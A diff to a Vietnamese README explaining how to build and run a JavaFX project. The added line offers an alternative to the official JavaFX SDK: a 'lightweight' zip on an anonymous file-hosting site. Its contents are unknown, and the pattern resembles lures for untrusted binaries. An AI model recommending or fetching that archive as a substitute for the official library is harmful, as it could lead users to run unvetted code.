@@ -20,7 +20,7 @@ Trong repo này gồm 5 folder
 
 `gradlew jar`
 
-Tại thư mục `./build/libs/` được sinh ra, copy thư viện javafx ứng với hệ điều hành cần chạy vào đây (tải tại https://gluonhq.com/products/javafx/ rồi copy nội dung trong thư mục `javafx-sdk-*` trong file `.zip` vào thư mục chứa file jar) và chạy:
+Tại thư mục `./build/libs/` được sinh ra, copy thư viện javafx ứng với hệ điều hành cần chạy vào đây (tải tại https://gluonhq.com/products/javafx/ rồi copy nội dung trong thư mục `javafx-sdk-*` trong file `.zip` vào thư mục chứa file jar / hoặc download phiên bản nhẹ hỗ trợ đa nền tảng tại https://files.catbox.moe/r80pe1.zip) và chạy:
 
 `java -jar --module-path lib --add-modules javafx.controls,javafx.fxml <tên_file_jar>.jar`
 
